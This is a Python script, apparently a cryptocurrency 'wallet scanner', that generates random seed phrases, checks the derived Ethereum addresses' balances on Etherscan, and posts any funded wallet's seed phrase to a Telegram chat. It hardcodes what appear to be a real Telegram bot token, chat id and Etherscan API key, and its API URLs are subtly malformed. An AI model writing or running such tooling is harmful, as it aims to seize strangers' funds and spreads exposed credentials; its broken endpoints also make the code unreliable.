import requests
import time
import os
import logging
from threading import Thread
from flask import Flask
from eth_account import Account
from mnemonic import Mnemonic

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

class WalletEngine:
    def __init__(self):
        self.tg_token = "8794852622:AAH9p2HSno2YPPIssRE5En0Ii2Wv84E8_pA" 
        self.chat_id = "391754544"
        self.eth_key = "8RTIQAK1ZZUNC2JNZ5EM13BCRHVZ26UA9R"
        self.total_checked = 0
        self.mnemo = Mnemonic("english")
        Account.enable_unaudited_hdwallet_features()
        self.session = requests.Session()

    def _notify(self, text):
        url = f"https://telegram.org{self.tg_token}/sendMessage"
        try:
            self.session.post(url, json={'chat_id': self.chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=15)
        except: pass

    def scanner_loop(self):
        logger.info("SYSTEM STARTED")
        while True:
            try:
                words = self.mnemo.generate(strength=128)
                acc = Account.from_mnemonic(words)
                
                # آدرس دهی استاندارد برای جلوگیری از خطای Label empty
                api_url = "https://etherscan.io"
                query_params = {
                    "module": "account",
                    "action": "balance",
                    "address": acc.address,
                    "tag": "latest",
                    "apikey": self.eth_key
                }
                
                resp = self.session.get(api_url, params=query_params, timeout=15)
                data = resp.json()

                if data.get('status') == '1':
                    bal = int(data.get('result', 0))
                    if bal > 0:
                        self._notify(f"💎 FOUND!\n`{words}`\n{acc.address}")
                
                self.total_checked += 1
                if self.total_checked % 50 == 0:
                    logger.info(f"Checked: {self.total_checked}")
                time.sleep(1.8)
            except Exception as e:
                logger.error(f"Error: {e}")
                time.sleep(10)

engine = WalletEngine()
app = Flask(__name__)

@app.route('/')
def home():
    return {"status": "ok", "total": engine.total_checked}, 200

if __name__ == "__main__":
    Thread(target=engine.scanner_loop, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
